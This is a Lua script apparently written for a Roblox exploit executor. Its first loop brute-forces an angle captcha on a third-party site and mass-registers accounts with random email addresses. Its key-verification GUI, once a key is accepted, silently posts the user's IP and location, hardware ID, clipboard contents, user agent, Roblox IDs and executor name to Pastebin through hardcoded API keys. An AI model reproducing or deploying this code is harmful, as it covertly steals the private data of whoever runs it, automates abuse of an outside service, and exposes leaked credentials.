LP = game.Players.LocalPlayer
HS = game.HttpService
HS.HttpEnabled = true
function GetJson(v)
    return HS:JSONDecode(HS:GetAsync(v))
end

task.spawn(function()
    while true do
        rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
        for i = 1, 360 do
            if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i).okey then
                random = {}
                for v = 0, 100 do
                    table.insert(random, string.char(math.random(97, 122)))
                end
                random = table.concat(random)
                print(GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand).msg)
                break
            end
        end
    end
end)

function Verify(t, f)
    Gui = Instance.new("ScreenGui", game.CoreGui)
    Main = Instance.new("Frame", Gui)
    Text = Instance.new("TextBox", Main)
    Button = Instance.new("TextButton", Main)
    
    Main.AnchorPoint = Vector2.new(0.5, 0.5)
    Main.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    Main.Position = UDim2.new(0.5, 0, 0.5, 0)
    Main.Size = UDim2.new(0.4, 0, 0.4, 0)
    
    Text.AnchorPoint = Vector2.new(0.5, 1)
    Text.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
    Text.Position = UDim2.new(0.5, 0, 0.45, 0)
    Text.Size = UDim2.new(0.6, 0, 0.4, 0)
    Text.TextSize = 20
    Text.Text = "输入"
    
    Button.AnchorPoint = Vector2.new(0.5, 0)
    Button.BackgroundColor3 = Color3.new(0, 1, 0)
    Button.Position = UDim2.new(0.5, 0, 0.55, 0)
    Button.Size = UDim2.new(0.5, 0, 0.4, 0)
    Button.TextSize = 20
    Button.Text = "确定"
    
    for i, v in pairs(Gui:GetDescendants()) do
        Instance.new("UICorner", v).CornerRadius = UDim.new(0.1, 0)
    end
    
    Button.MouseButton1Down:Connect(function()
        if t[LP.Name] == Text.Text then
            Gui:Destroy()
            f()
            HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=1&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
                List = t,
                IP = GetJson("https://cz88.net/api/cz88/ip/accurate?ip="..GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip),
                UA = HS:GetUserAgent(),
                Game = game.GameId,
                User = LP.UserId,
                Hwid = gethwid(),
                Clipboard = getclipboard(),
                Executor = identifyexecutor()
            })), "ApplicationUrlEncoded")
        else
            game.StarterGui:SetCore("SendNotification", {
            Title = "警告",
            Text = "检查密钥或是否在白名单"
            })
        end
    end)
end
